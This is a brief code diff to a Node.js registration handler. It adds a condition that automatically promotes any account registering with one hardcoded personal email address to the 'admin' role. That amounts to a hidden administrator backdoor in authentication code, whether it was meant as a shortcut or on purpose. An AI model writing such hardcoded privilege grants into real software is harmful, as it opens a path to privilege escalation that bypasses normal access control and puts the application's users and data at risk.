@@ -116,6 +116,10 @@ exports.register = async (req, res) => {
             isActive: true,
         });
 
+        if (user.email === "yugaldhiman14@gmail.com") {
+            user.role = "admin";
+        }
+
         await user.save();
 
         res.status(201).json({
